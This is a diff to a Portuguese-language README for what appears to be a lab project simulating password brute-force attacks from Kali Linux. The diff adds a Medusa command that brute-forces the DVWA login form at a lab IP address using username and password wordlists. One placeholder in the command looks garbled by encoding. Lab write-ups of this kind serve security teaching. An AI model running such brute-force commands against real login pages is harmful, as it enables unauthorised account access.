@@ -30,6 +30,9 @@ Para que o Medusa saiba que o login falhou, identificamos que a aplicação reto
 
 3. Execução com Medusa
 O comando utilizado simulou as interações que um usuário teria no navegador, mas de forma automatizada.
+```
+medusa -h 172.30.0.101 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=ÛSER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6
+```
 
 ![execucao-com-medusa](https://github.com/adrianosalves/simulando-ataque-brute-force-de-senhas-KaliLinux/blob/main/imagens/execuca-com-medusa.png)
 
